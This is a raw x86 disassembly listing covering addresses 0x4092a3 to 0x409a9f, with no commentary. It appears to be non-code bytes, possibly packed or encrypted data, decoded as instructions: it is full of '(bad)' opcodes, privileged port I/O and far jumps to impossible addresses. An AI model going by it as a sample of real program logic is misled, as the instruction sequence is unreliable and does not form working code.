  4092a3:	test   DWORD PTR [edi-0x216304a8],edi
  4092a9:	add    al,0xc1
  4092ab:	lahf   
  4092ac:	stc    
  4092ad:	or     DWORD PTR [ebp*1-0x6326cccd],ebp
  4092b4:	clc    
  4092b5:	pop    es
  4092b6:	out    dx,al
  4092b7:	mov    esi,0x6f426264
  4092bc:	push   edi
  4092bd:	pusha  
  4092be:	push   0xa40ad79b
  4092c3:	ja     0x4092e0
  4092c5:	clc    
  4092c6:	(bad)  
  4092c7:	xor    eax,0x87982578
  4092cc:	mov    ds:0x24566c7b,eax
  4092d1:	cmp    BYTE PTR [eax],bh
  4092d3:	(bad)  
  4092d4:	outs   dx,BYTE PTR ds:[esi]
  4092d5:	enter  0xfafb,0x2d
  4092d9:	call   0x2eb0a728
  4092de:	pop    esp
  4092df:	mov    dh,0xb
  4092e1:	push   eax
  4092e2:	pop    ebp
  4092e3:	inc    ebx
  4092e4:	lds    edx,FWORD PTR [esi]
  4092e6:	sbb    al,0x5
  4092e8:	mov    DWORD PTR [edx+edi*1-0x4a],edx
  4092ec:	mov    al,0x4c
  4092ee:	shl    ebx,1
  4092f0:	lea    edi,[ecx-0x76e01647]
  4092f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f7:	mulps  xmm6,XMMWORD PTR [edi-0x5a]
  4092fb:	in     eax,0x69
  4092fd:	inc    ecx
  4092fe:	aam    0x10
  409300:	lods   eax,DWORD PTR ds:[esi]
  409301:	call   0x49b29ac1
  409306:	jbe    0x40931e
  409308:	das    
  409309:	sub    al,0x37
  40930b:	out    dx,eax
  40930c:	sar    DWORD PTR [ebp+ecx*1+0x67],1
  409310:	push   ds
  409311:	popa   
  409312:	mov    bh,0xe3
  409314:	add    eax,0x194c6bc0
  409319:	mov    ds:0x22364c9d,ax
  40931f:	arpl   WORD PTR [eax+0x6e],di
  409322:	mov    ds:0x8084997a,al
  409327:	jle    0x40937e
  409329:	pop    es
  40932a:	fimul  DWORD PTR [esi+0x5a]
  40932d:	je     0x4092ea
  40932f:	test   al,0x84
  409331:	imul   ebx,DWORD PTR [esi],0xffffff87
  409334:	dec    ecx
  409335:	push   ebp
  409336:	stc    
  409337:	daa    
  409338:	mov    edx,0x905693d0
  40933d:	bound  ecx,QWORD PTR [ebp-0x784b15a7]
  409343:	dec    ebx
  409344:	iret   
  409345:	sahf   
  409346:	push   ecx
  409347:	pop    eax
  409348:	add    edi,eax
  40934a:	pusha  
  40934b:	adc    edi,DWORD PTR [eax-0x34]
  40934e:	out    dx,eax
  40934f:	and    ebp,DWORD PTR [eax-0x641ef130]
  409355:	(bad)  
  409356:	mov    eax,DWORD PTR ds:0xfe5e11cd
  40935c:	(bad)  
  40935d:	in     al,dx
  40935e:	dec    ebp
  40935f:	inc    edi
  409360:	xchg   esp,eax
  409361:	lods   eax,DWORD PTR ds:[esi]
  409362:	xchg   ebx,eax
  409363:	add    esp,DWORD PTR [edi]
  409365:	aaa    
  409366:	mov    ebp,0x30ef4fbf
  40936b:	xchg   esp,eax
  40936c:	xor    DWORD PTR [edx-0x29f6c51c],ecx
  409372:	cwde   
  409373:	ds leave 
  409375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409376:	mov    cl,0xb0
  409378:	pop    ebp
  409379:	test   eax,0xefa2e501
  40937e:	xchg   edx,eax
  40937f:	xor    DWORD PTR ds:0x591b0325,0xffffffec
  409386:	shl    ah,0xf3
  409389:	add    eax,0x927af176
  40938e:	out    dx,eax
  40938f:	retf   0x9a66
  409392:	jl     0x40931f
  409394:	mov    ebp,ecx
  409396:	xor    al,0x83
  409398:	and    al,0x70
  40939a:	adc    ecx,DWORD PTR [ebx+0x4e38b71d]
  4093a0:	call   0x6a520592
  4093a5:	enter  0xbd57,0x2d
  4093a9:	sbb    al,al
  4093ab:	pop    edx
  4093ac:	push   edx
  4093ad:	sbb    al,BYTE PTR [edx]
  4093af:	enter  0x4249,0x66
  4093b3:	aam    0x91
  4093b5:	cmp    al,0x3d
  4093b7:	cmp    al,0x3e
  4093b9:	push   ebx
  4093ba:	lock mov bh,0x22
  4093bd:	push   edi
  4093be:	or     bl,cl
  4093c0:	in     al,0xa6
  4093c2:	pop    ds
  4093c3:	mov    cs,WORD PTR [esi-0x450da371]
  4093c9:	pop    ebp
  4093ca:	or     al,0xbf
  4093cc:	mov    eax,ds:0x92e0ff89
  4093d1:	(bad)  
  4093d2:	clc    
  4093d3:	fcmovnu st,st(0)
  4093d5:	ja     0x409429
  4093d7:	inc    eax
  4093d8:	and    ah,al
  4093da:	cwde   
  4093db:	and    DWORD PTR [eax-0x3a],edx
  4093de:	mov    eax,0xd4d72657
  4093e3:	xchg   esi,eax
  4093e4:	add    dl,dl
  4093e6:	and    ebp,DWORD PTR [eax]
  4093e8:	push   edx
  4093e9:	rcl    ch,cl
  4093eb:	mov    eax,ds:0x8e655d0c
  4093f0:	xor    ah,BYTE PTR [eax-0x5fd33a18]
  4093f6:	mov    al,0x99
  4093f8:	cmp    DWORD PTR [ebp-0x26],0x64
  4093fc:	mov    gs,WORD PTR [edx+eax*2-0x571299c]
  409403:	mov    BYTE PTR ds:0xa81b2d37,ch
  409409:	push   ecx
  40940a:	jno    0x40939d
  40940c:	dec    eax
  40940d:	or     ebx,DWORD PTR [esi+0x34]
  409410:	fist   WORD PTR [ebx+eax*1+0x7f537815]
  409417:	call   0xc3341751
  40941c:	add    al,0x2b
  40941e:	cwde   
  40941f:	lods   al,BYTE PTR ds:[esi]
  409420:	hlt    
  409421:	push   cs
  409422:	bound  esi,QWORD PTR [eax-0x2]
  409425:	lahf   
  409426:	out    dx,al
  409427:	sub    BYTE PTR [eax],0x51
  40942a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40942c:	xchg   DWORD PTR [ecx-0x2f],eax
  40942f:	dec    edx
  409430:	daa    
  409431:	sar    DWORD PTR [ebp-0x50238034],0xcc
  409438:	ds hlt 
  40943a:	iret   
  40943b:	push   ecx
  40943c:	int3   
  40943d:	sbb    BYTE PTR [esi-0x1cb49369],al
  409443:	mov    ah,0xa5
  409445:	xlat   BYTE PTR ds:[ebx]
  409446:	and    eax,0xce80999c
  40944b:	mov    bl,0x7
  40944d:	mov    edi,ebx
  40944f:	leave  
  409450:	pushf  
  409451:	adc    eax,0xdc30b633
  409456:	lea    edi,[esi-0x7d9e02f1]
  40945c:	xor    eax,0x46e1a285
  409461:	mov    esi,0xdb78e326
  409466:	add    al,0xda
  409468:	cwde   
  409469:	repz shr BYTE PTR [edx-0x26],cl
  40946d:	into   
  40946e:	push   es
  40946f:	adc    BYTE PTR [ebp-0x19418b7a],bh
  409475:	xchg   edx,eax
  409476:	jle    0x409473
  409478:	mov    al,0xc6
  40947a:	adc    al,0x1e
  40947c:	xor    eax,0x96579816
  409481:	imul   esp,DWORD PTR [esi+0x77],0xbd819d47
  409488:	inc    ecx
  409489:	jae    0x4094a6
  40948b:	fimul  WORD PTR [esi+0x76]
  40948e:	push   ss
  40948f:	test   DWORD PTR [edx-0x67acbe53],0xeec2b004
  409499:	ins    DWORD PTR es:[edi],dx
  40949a:	adc    BYTE PTR [ebp-0x61],al
  40949d:	inc    edx
  40949e:	shl    BYTE PTR [edx],0x1c
  4094a1:	aad    0x7e
  4094a3:	sbb    BYTE PTR [esi],cl
  4094a5:	retf   0x513f
  4094a8:	ds test eax,0xa02885da
  4094ae:	mov    cl,0x4e
  4094b0:	cmp    DWORD PTR [eax],0x132b5dd4
  4094b6:	retf   
  4094b7:	sar    esp,cl
  4094b9:	mov    eax,ds:0xf89c9d40
  4094be:	mov    BYTE PTR [edx],al
  4094c0:	cmp    DWORD PTR [ebx-0x3ca109f8],eax
  4094c6:	and    al,0xe1
  4094c8:	nop
  4094c9:	cli    
  4094ca:	inc    eax
  4094cb:	enter  0x4ae,0xb2
  4094cf:	fld    TBYTE PTR [esi-0x16a9a2e7]
  4094d5:	fisttp WORD PTR [ebx+edx*2]
  4094d8:	inc    ecx
  4094d9:	stc    
  4094da:	sbb    dl,BYTE PTR [ebx+0x5bc328e]
  4094e0:	imul   edi,ecx,0xc2d5afc3
  4094e6:	pop    ebp
  4094e7:	mov    ebx,0x48dfd64
  4094ec:	(bad)  
  4094ed:	stc    
  4094ee:	int    0x42
  4094f0:	popf   
  4094f1:	mov    al,0x6e
  4094f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094f4:	mov    ds:0x46984abd,eax
  4094f9:	in     eax,0xb4
  4094fb:	mov    eax,ds:0x5cd61e7b
  409500:	ss popf 
  409502:	or     eax,0x6b681b19
  409507:	or     eax,0x8bda02c7
  40950c:	inc    ebx
  40950d:	pop    esi
  40950e:	add    BYTE PTR [ecx],al
  409510:	ins    BYTE PTR es:[edi],dx
  409511:	lods   eax,DWORD PTR ds:[esi]
  409512:	mov    al,0x43
  409514:	cld    
  409515:	ja     0x4094fb
  409517:	out    dx,eax
  409518:	aad    0xb9
  40951a:	fbstp  TBYTE PTR [ebx]
  40951c:	cwde   
  40951d:	sbb    eax,0xd1d96a57
  409522:	jle    0x40954f
  409524:	loope  0x409523
  409526:	stos   DWORD PTR es:[edi],eax
  409527:	jge    0x4094d1
  409529:	test   al,0xf4
  40952b:	mov    esi,0xdd9d55bd
  409530:	mov    BYTE PTR [edi-0x6e0fe719],cl
  409536:	cmp    al,0x63
  409538:	jg     0x409584
  40953a:	mov    dh,al
  40953c:	pop    esi
  40953d:	add    al,0xae
  40953f:	out    0xde,al
  409541:	dec    ecx
  409542:	dec    eax
  409543:	pop    ebp
  409544:	das    
  409545:	stos   DWORD PTR es:[edi],eax
  409546:	mov    cl,0x24
  409548:	fnstcw WORD PTR [ebx+0x35]
  40954b:	cmp    edi,esi
  40954d:	sbb    eax,0xdc6e7b8a
  409552:	jg     0x409571
  409554:	test   BYTE PTR [eax+0x7e0b02db],al
  40955a:	sar    BYTE PTR ds:0x5e88a68e,1
  409560:	cmp    esi,DWORD PTR [ebp+0x2d30279]
  409566:	gs mov cl,0x53
  409569:	mul    BYTE PTR [ecx]
  40956b:	jecxz  0x409520
  40956d:	pusha  
  40956e:	mov    ebx,0x6afda1fc
  409573:	aas    
  409574:	stos   DWORD PTR es:[edi],eax
  409575:	loopne 0x40950d
  409577:	scas   eax,DWORD PTR es:[edi]
  409578:	lds    edi,FWORD PTR [eax+0xd6aac21]
  40957e:	xchg   edx,eax
  40957f:	sbb    ebx,DWORD PTR [edx-0x5078780]
  409585:	push   0xffffffad
  409587:	dec    ebx
  409588:	jecxz  0x409606
  40958a:	mov    ds,ecx
  40958c:	fnstcw WORD PTR [ebx+ecx*4]
  40958f:	push   ebp
  409590:	stc    
  409591:	fcmovne st,st(1)
  409593:	and    al,0x28
  409595:	lds    ebp,FWORD PTR [ecx-0x3b6031b9]
  40959b:	xchg   ebp,eax
  40959c:	popa   
  40959d:	hlt    
  40959e:	sbb    al,BYTE PTR [edx-0x62]
  4095a1:	je     0x40956e
  4095a3:	out    dx,eax
  4095a4:	jmp    0x40956d
  4095a6:	add    eax,0x4faad852
  4095ab:	sbb    al,BYTE PTR [esi+0x7a]
  4095ae:	imul   eax,DWORD PTR [esi+eax*8],0x82850c16
  4095b5:	fild   WORD PTR [edi+0x44]
  4095b8:	sbb    ebx,ebx
  4095ba:	pushf  
  4095bb:	aas    
  4095bc:	or     al,0x55
  4095be:	inc    edi
  4095bf:	loop   0x40963c
  4095c1:	mov    esp,0xcf7bd37b
  4095c6:	push   0xa674f5be
  4095cb:	xor    al,0x5
  4095cd:	mov    ebx,0x3a7acc15
  4095d2:	std    
  4095d3:	mov    esi,0x37339089
  4095d8:	jb     0x40958a
  4095da:	and    eax,0x6c9370d0
  4095df:	or     eax,ebx
  4095e1:	xor    ebx,eax
  4095e3:	cli    
  4095e4:	fisttp DWORD PTR [ebp-0x1ad69f96]
  4095ea:	xchg   ecx,eax
  4095eb:	add    bl,dh
  4095ed:	aam    0x1c
  4095ef:	scas   eax,DWORD PTR es:[edi]
  4095f0:	ins    BYTE PTR es:[edi],dx
  4095f1:	xor    al,0x2e
  4095f3:	in     al,0x4a
  4095f5:	shl    al,0xf7
  4095f8:	mov    bh,0x18
  4095fa:	xchg   esi,eax
  4095fb:	fstp   DWORD PTR [esi+0x38]
  4095fe:	inc    edi
  4095ff:	shr    BYTE PTR [ebx],cl
  409601:	in     eax,0x2d
  409603:	push   0xfffffff4
  409605:	xchg   edi,eax
  409606:	jecxz  0x4095f9
  409608:	jae    0x40966d
  40960a:	ficomp WORD PTR [eax]
  40960c:	loop   0x40964c
  40960e:	retf   0xe8f4
  409611:	xchg   BYTE PTR [eax+0x7ffe28de],dl
  409617:	or     ch,al
  409619:	or     eax,0xddbada6
  40961e:	out    dx,eax
  40961f:	mov    esp,0x2654f31a
  409624:	sbb    bl,BYTE PTR [edx+0x6d5b6caa]
  40962a:	push   ecx
  40962b:	dec    edx
  40962c:	jmp    0xf44f:0x5f6426ed
  409633:	stos   BYTE PTR es:[edi],al
  409634:	dec    ecx
  409635:	ss scas al,BYTE PTR es:[edi]
  409637:	ss mov esp,0xfa2d8823
  40963d:	es pop edx
  40963f:	push   ebp
  409640:	jmp    0x9a08d233
  409645:	out    0x1,al
  409647:	mov    edx,0xfa135bde
  40964d:	or     ebp,DWORD PTR [ebp-0x29caacfc]
  409653:	and    ch,BYTE PTR [ebp-0x71]
  409656:	clc    
  409657:	daa    
  409658:	push   ss
  409659:	mov    ebx,0x7769455a
  40965e:	cmp    cl,dh
  409660:	jl     0x4095e9
  409662:	sub    esp,DWORD PTR [ebx+0x67f36c1b]
  409668:	pop    ebx
  409669:	jns    0x409689
  40966b:	out    dx,al
  40966c:	add    al,0x4f
  40966e:	hlt    
  40966f:	xor    DWORD PTR [eax],eax
  409671:	lods   eax,DWORD PTR ds:[esi]
  409672:	jo     0x4096ef
  409674:	mov    ebp,0x5afc046c
  409679:	cmp    BYTE PTR [eax],al
  40967b:	mov    cl,0xa1
  40967d:	cwde   
  40967e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40967f:	test   DWORD PTR [ebx],edx
  409681:	mov    ah,0xbf
  409683:	pop    ecx
  409684:	stc    
  409685:	dec    edx
  409686:	jmp    0xf88e:0xba13db5a
  40968d:	ja     0x40966e
  40968f:	repz adc eax,0x5efdd83f
  409695:	ins    BYTE PTR es:[edi],dx
  409696:	mov    al,ds:0x7485fda7
  40969b:	addps  xmm7,XMMWORD PTR ds:0x2d0d1998
  4096a2:	addr16 test eax,0xd946238a
  4096a8:	or     BYTE PTR ds:[edi+0x39],dh
  4096ac:	ins    BYTE PTR es:[edi],dx
  4096ad:	rcr    DWORD PTR [esp+edi*1],cl
  4096b0:	fwait
  4096b1:	icebp  
  4096b2:	cmp    bl,BYTE PTR [edi+0x3e]
  4096b5:	pop    eax
  4096b6:	(bad)  
  4096b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096b9:	imul   edx,ecx,0xd928ae2c
  4096bf:	push   eax
  4096c0:	inc    eax
  4096c1:	cli    
  4096c2:	jnp    0x4096d4
  4096c4:	inc    esi
  4096c5:	pushf  
  4096c6:	imul   edx,DWORD PTR [ebp*8-0x2fd0417e],0xce70c287
  4096d1:	push   eax
  4096d2:	sub    eax,0x7a34deae
  4096d7:	test   dl,0x55
  4096da:	adc    al,0xbf
  4096dc:	bound  edx,QWORD PTR [eax+ebx*2+0x65]
  4096e0:	adc    DWORD PTR [ebx],ecx
  4096e2:	adc    eax,0x340ae275
  4096e7:	test   BYTE PTR [eax-0x2a],al
  4096ea:	push   es
  4096eb:	or     eax,DWORD PTR [edx-0x1dea71ae]
  4096f1:	std    
  4096f2:	mov    ds:0x9ea4d44e,al
  4096f7:	int    0x57
  4096f9:	jbe    0x40967c
  4096fb:	scas   eax,DWORD PTR es:[edi]
  4096fc:	dec    edi
  4096fd:	and    al,BYTE PTR [esi+ebx*1+0x6d]
  409701:	enter  0x9ee8,0x93
  409705:	xlat   BYTE PTR ds:[ebx]
  409706:	and    al,BYTE PTR [edi+eiz*8]
  409709:	outs   dx,DWORD PTR ds:[esi]
  40970a:	sti    
  40970b:	add    ebx,DWORD PTR [edi-0x1c]
  40970e:	ror    BYTE PTR [ebx-0x50a9c6f3],0xeb
  409715:	inc    esi
  409716:	mov    eax,DWORD PTR [edx]
  409718:	inc    edx
  409719:	(bad)  
  40971a:	shl    DWORD PTR [ebx-0x3a66fbd0],cl
  409720:	or     BYTE PTR [ebx+edx*2-0x432fc7c3],0xd6
  409728:	cmp    esi,ebx
  40972a:	daa    
  40972b:	push   0xb839fd64
  409730:	jmp    0x40978c
  409732:	out    dx,eax
  409733:	add    al,0x19
  409735:	mov    al,ds:0x331dce03
  40973a:	mov    esi,?
  40973c:	fistp  DWORD PTR [ebp-0x43]
  40973f:	in     al,dx
  409740:	fimul  WORD PTR [esi-0x5d]
  409743:	and    esp,DWORD PTR [ebp+ecx*8+0x2e]
  409747:	sub    BYTE PTR [ecx],al
  409749:	das    
  40974a:	sub    al,0x3e
  40974c:	jmp    0x409738
  40974e:	shl    DWORD PTR [ebx],0x21
  409751:	push   edi
  409752:	(bad)  
  409753:	hlt    
  409754:	or     WORD PTR [edx+0x1d317440],bp
  40975b:	dec    ebp
  40975c:	les    edx,FWORD PTR [esi+0x7d]
  40975f:	jae    0x409734
  409761:	in     eax,dx
  409762:	test   DWORD PTR [ebx],edi
  409764:	xor    al,0xdb
  409766:	mov    bh,BYTE PTR [ebp+ebp*2-0x397ec4d]
  40976d:	xchg   edi,eax
  40976e:	and    edi,DWORD PTR [esi]
  409770:	inc    ebx
  409771:	test   BYTE PTR [eax+0x0],bh
  409774:	dec    ebx
  409775:	test   BYTE PTR [ebx-0x17],bh
  409778:	mov    bh,0x7a
  40977a:	mov    WORD PTR [ebp-0x15],?
  40977d:	test   DWORD PTR [ebx+0x6022b50d],ebp
  409783:	cmp    al,0xa3
  409785:	cmc    
  409786:	cmpxchg dh,ch
  409789:	mov    eax,0x8b7bf98b
  40978e:	jno    0x4097fb
  409790:	lock sbb BYTE PTR [edx+0x48],ch
  409794:	leave  
  409795:	ss xchg esi,eax
  409797:	repnz and esi,ebp
  40979a:	inc    edi
  40979b:	loope  0x409746
  40979d:	and    eax,0xc6b4c33b
  4097a2:	jb     0x4097a8
  4097a4:	mov    bl,dl
  4097a6:	fnsave [ecx+0x1c3a9cc2]
  4097ac:	es loopne 0x40978a
  4097af:	mov    es,WORD PTR [esi+0x38022bb2]
  4097b5:	out    0xf1,al
  4097b7:	mov    ds:0x52d6b6fd,al
  4097bc:	arpl   WORD PTR [ebx+ecx*8+0x77],di
  4097c0:	dec    ebx
  4097c1:	lea    eax,[ebx-0x6c]
  4097c4:	xchg   ebp,eax
  4097c5:	and    al,0xd2
  4097c7:	cwde   
  4097c8:	aam    0xfe
  4097ca:	add    dh,BYTE PTR [ecx+eax*8]
  4097cd:	and    cl,BYTE PTR [ecx+0x2a]
  4097d0:	clc    
  4097d1:	and    al,BYTE PTR [ebx-0x305176d3]
  4097d7:	push   edi
  4097d8:	mov    DWORD PTR [edi-0x48d7f892],edx
  4097de:	mov    WORD PTR [eax-0xdc32deb],ds
  4097e4:	adc    ebp,DWORD PTR [ebp-0xbb8ab81]
  4097ea:	(bad)  
  4097ec:	jle    0x409797
  4097ee:	jp     0x409865
  4097f0:	or     DWORD PTR [eax+0x666f0037],ebx
  4097f6:	dec    edx
  4097f7:	xor    BYTE PTR [edi-0x61],0x45
  4097fb:	mov    bl,0x36
  4097fd:	inc    edx
  4097fe:	push   cs
  4097ff:	xchg   ebx,eax
  409800:	mov    eax,0x9f4813eb
  409805:	cld    
  409806:	arpl   WORD PTR [edi-0x59f0d8cb],bx
  40980c:	inc    edx
  40980d:	in     al,dx
  40980e:	aas    
  40980f:	sbb    ah,BYTE PTR [esi+0x38]
  409812:	add    BYTE PTR [ecx-0x32b8a5d0],dl
  409818:	jnp    0x409857
  40981a:	loope  0x40987b
  40981c:	dec    eax
  40981d:	popf   
  40981e:	mov    dl,0x35
  409820:	loope  0x40982d
  409822:	mov    esp,0xb79f3d74
  409827:	ret    
  409828:	inc    esi
  409829:	jl     0x40983f
  40982b:	inc    ecx
  40982c:	or     bh,BYTE PTR [ebx]
  40982e:	in     al,dx
  40982f:	adc    DWORD PTR [ecx+0x7f],ecx
  409832:	mov    dh,0xef
  409834:	scas   al,BYTE PTR es:[edi]
  409835:	cld    
  409836:	dec    ecx
  409837:	xchg   esi,eax
  409838:	das    
  409839:	inc    edx
  40983a:	mov    dh,0x4b
  40983c:	push   ebp
  40983d:	sbb    edi,DWORD PTR [edx-0x5146bcd7]
  409843:	mov    DWORD PTR ds:0x18eccfba,esi
  409849:	fnstsw WORD PTR [eax+0x3a]
  40984c:	sub    BYTE PTR [edx],0xa3
  40984f:	add    al,0x13
  409851:	or     DWORD PTR [eax-0x5a],esp
  409854:	(bad)  
  409855:	mov    ecx,esp
  409857:	dec    edx
  409858:	pop    ebx
  409859:	dec    ebx
  40985a:	imul   edx,ebx,0xa6aa2a58
  409860:	pop    edx
  409861:	data16 loopne 0x40980a
  409864:	pop    edx
  409865:	dec    BYTE PTR [edi+0x320589f]
  40986b:	jnp    0x409836
  40986d:	or     edx,DWORD PTR [edi-0x6e]
  409870:	and    eax,0x3dd573ff
  409875:	push   eax
  409876:	loope  0x409874
  409878:	push   edx
  409879:	aas    
  40987a:	xor    DWORD PTR [ebx],edi
  40987c:	sub    DWORD PTR [ebx+0x28],ebx
  40987f:	mov    ecx,0x61c5fcd
  409884:	and    esp,DWORD PTR [ebx+0x69]
  409887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409888:	adc    BYTE PTR [ebp+ebx*2-0x5b],ah
  40988c:	jo     0x409852
  40988e:	lock sub DWORD PTR [eax+0x2fdfe901],esi
  409895:	xor    bl,BYTE PTR [eax+ebx*8]
  409898:	sar    al,0xce
  40989b:	fild   QWORD PTR [ebx]
  40989d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40989e:	test   ebp,edx
  4098a0:	and    edi,esp
  4098a2:	pop    ecx
  4098a3:	add    al,0xe6
  4098a5:	sti    
  4098a6:	mov    bh,0xa9
  4098a8:	pop    eax
  4098a9:	lds    edx,FWORD PTR [eax+eiz*2+0x12298edb]
  4098b0:	jp     0x40986a
  4098b2:	xchg   DWORD PTR [esp+edi*1],ebp
  4098b5:	xchg   DWORD PTR [ebx+0x60],esi
  4098b8:	dec    esi
  4098b9:	in     eax,0x64
  4098bb:	mov    ebx,DWORD PTR ds:0x620fde84
  4098c1:	popa   
  4098c2:	inc    ecx
  4098c3:	mov    al,ds:0x1244210
  4098c8:	ds mov al,0x81
  4098cb:	xchg   esi,eax
  4098cc:	and    esp,ebp
  4098ce:	sar    DWORD PTR [ecx],cl
  4098d0:	outs   dx,DWORD PTR ds:[esi]
  4098d1:	fld    DWORD PTR [edi]
  4098d3:	mov    esi,0x39f1f46e
  4098d8:	push   cs
  4098d9:	out    0x84,eax
  4098db:	xchg   edx,eax
  4098dc:	std    
  4098dd:	das    
  4098de:	sub    eax,DWORD PTR [eax]
  4098e0:	xchg   ebp,eax
  4098e1:	mov    ebx,DWORD PTR [esi+0x74]
  4098e4:	es pop ds
  4098e6:	retf   
  4098e7:	jnp    0x409900
  4098e9:	pop    edx
  4098ea:	stc    
  4098eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ec:	outs   dx,BYTE PTR ds:[esi]
  4098ed:	outs   dx,DWORD PTR ds:[esi]
  4098ee:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4098f0:	not    BYTE PTR [eax]
  4098f2:	aad    0x9c
  4098f4:	cmc    
  4098f5:	xchg   ecx,eax
  4098f6:	push   cs
  4098f7:	xor    eax,0x88bd2561
  4098fc:	call   0x3893:0xba6fca3a
  409903:	push   ss
  409904:	mov    esp,0x2c0bf743
  409909:	xchg   BYTE PTR [edi-0x52],cl
  40990c:	mov    al,0xf3
  40990e:	mov    esi,0xad1f3436
  409913:	pop    ebp
  409914:	push   DWORD PTR [ecx+0x3f]
  409917:	and    DWORD PTR [ebp-0x72d4a58b],ecx
  40991d:	aas    
  40991e:	dec    edx
  40991f:	dec    esi
  409920:	loop   0x409921
  409922:	dec    esp
  409923:	xor    DWORD PTR [edi+edi*4-0x75d1d82b],ebp
  40992a:	fwait
  40992b:	outs   dx,DWORD PTR ds:[esi]
  40992c:	popa   
  40992d:	mov    bl,0x55
  40992f:	jge    0x409926
  409931:	sbb    BYTE PTR [ecx],bl
  409933:	ret    
  409934:	inc    eax
  409935:	repz sbb edi,DWORD PTR [ecx-0x6c]
  409939:	hlt    
  40993a:	repnz shl ah,0x75
  40993e:	es and eax,0xcf3da33
  409944:	or     DWORD PTR [esi+0x40],ecx
  409947:	outs   dx,BYTE PTR ds:[esi]
  409948:	lock cli 
  40994a:	leave  
  40994b:	lahf   
  40994c:	mov    edi,edx
  40994e:	(bad)  ds:0x19f6afc9
  409954:	jns    0x409900
  409956:	add    al,0x6f
  409958:	or     ah,0xb6
  40995b:	and    DWORD PTR [edi],0x1c
  40995e:	sbb    al,ah
  409960:	test   DWORD PTR [ebx+0x26],eax
  409963:	enter  0x9767,0x54
  409967:	sti    
  409968:	das    
  409969:	hlt    
  40996a:	pop    esi
  40996b:	popa   
  40996c:	and    ebp,edi
  40996e:	pop    esi
  40996f:	jmp    0xe9e:0xfa6f674e
  409976:	stos   BYTE PTR es:[edi],al
  409977:	push   ds
  409978:	mov    ebx,0x7b707771
  40997d:	and    al,0xba
  40997f:	pop    ds
  409980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409981:	pop    eax
  409982:	adc    DWORD PTR [ebp+0x10237a7a],0x7b
  409989:	add    esp,ecx
  40998b:	out    0x1a,eax
  40998d:	std    
  40998e:	xor    eax,0x451bcbaf
  409993:	es mov dl,0xf0
  409996:	mov    dl,0xbf
  409998:	add    al,0xeb
  40999a:	addr16 out 0x5a,al
  40999d:	inc    eax
  40999e:	or     eax,0x3fb2dfee
  4099a3:	int    0x24
  4099a5:	mov    eax,0x7347be01
  4099aa:	lds    esp,FWORD PTR [eax-0x53]
  4099ad:	jge    0xc80fb602
  4099b3:	mov    esi,DWORD PTR [eax-0x42322b56]
  4099b9:	scas   eax,DWORD PTR es:[edi]
  4099ba:	xchg   BYTE PTR [edx+0x4f],bh
  4099bd:	xchg   ebx,eax
  4099be:	push   edi
  4099bf:	neg    DWORD PTR [ecx-0x10]
  4099c2:	xlat   BYTE PTR ds:[ebx]
  4099c3:	jnp    0x409980
  4099c5:	sub    bh,BYTE PTR [esi]
  4099c7:	and    DWORD PTR [eax-0x1b],0xf64d3e84
  4099ce:	repz sbb DWORD PTR [ebx-0xed62a14],0xffffffa8
  4099d6:	or     ecx,DWORD PTR [ebx+esi*2+0xc]
  4099da:	lea    edi,[ecx+0x6af8b361]
  4099e0:	sbb    BYTE PTR [esi-0x43],ch
  4099e3:	out    0xcc,al
  4099e5:	test   DWORD PTR [ebp+0x464d2130],ebx
  4099eb:	and    ah,BYTE PTR [edi]
  4099ed:	and    DWORD PTR [edi+0x67],eax
  4099f0:	or     bl,BYTE PTR [esi]
  4099f2:	and    eax,0xef333a20
  4099f7:	pop    ss
  4099f8:	aas    
  4099f9:	into   
  4099fa:	push   edx
  4099fb:	int    0x22
  4099fd:	(bad)  
  4099fe:	pop    esp
  4099ff:	inc    esp
  409a00:	jmp    0x8760:0x5142eb74
  409a07:	stc    
  409a08:	ja     0x4099a3
  409a0a:	into   
  409a0b:	xor    al,ah
  409a0d:	mov    ecx,0xe62dfd99
  409a12:	(bad)
  409a16:	(bad)  
  409a18:	ja     0x4099db
  409a1a:	mov    ebx,0x6d70ac12
  409a1f:	pop    ss
  409a20:	fidivr DWORD PTR [ebx+ecx*8+0x39de8b9e]
  409a27:	mov    eax,0x3c478377
  409a2c:	jmp    0xc8aa3902
  409a31:	bound  edi,QWORD PTR [edi-0x20bba535]
  409a37:	inc    edi
  409a38:	jge    0x409a0d
  409a3a:	mov    es,WORD PTR [edi+eiz*8+0x67]
  409a3e:	fst    QWORD PTR [ecx+0x7c]
  409a41:	fistp  DWORD PTR ds:0xda446a92
  409a47:	into   
  409a48:	int3   
  409a49:	push   ebx
  409a4a:	sbb    ebp,edx
  409a4c:	sar    DWORD PTR [edx],cl
  409a4e:	pop    es
  409a4f:	xor    al,0x24
  409a51:	ret    0x9465
  409a54:	lods   eax,DWORD PTR ds:[esi]
  409a55:	lahf   
  409a56:	fbstp  TBYTE PTR [ecx-0x4d8ae51e]
  409a5c:	sbb    ebp,edx
  409a5e:	pop    es
  409a5f:	cmp    DWORD PTR [esi+0x4e],eax
  409a62:	into   
  409a63:	add    BYTE PTR [ecx-0xf],bl
  409a66:	ret    
  409a67:	rcl    ebp,1
  409a69:	dec    ebx
  409a6a:	mov    dh,0xb3
  409a6c:	jno    0x409ade
  409a6e:	lods   al,BYTE PTR ds:[esi]
  409a6f:	call   0x2239dcd9
  409a74:	push   0xffffffaf
  409a76:	mov    ebp,0xb9745beb
  409a7b:	gs jbe 0x409a9c
  409a7e:	sbb    al,BYTE PTR [ecx]
  409a80:	jge    0x409a2e
  409a82:	adc    DWORD PTR [ebx+0x3e47d446],eax
  409a88:	ins    BYTE PTR es:[edi],dx
  409a89:	mov    DWORD PTR [ebx-0x69],ecx
  409a8c:	shl    BYTE PTR [ebx-0x58d10d86],cl
  409a92:	sar    DWORD PTR [edi-0x7f5f23d],0xfc
  409a99:	xor    ebx,DWORD PTR [eax-0x680ac64b]
  409a9f:	mov    ecx,0x8a3ccc51
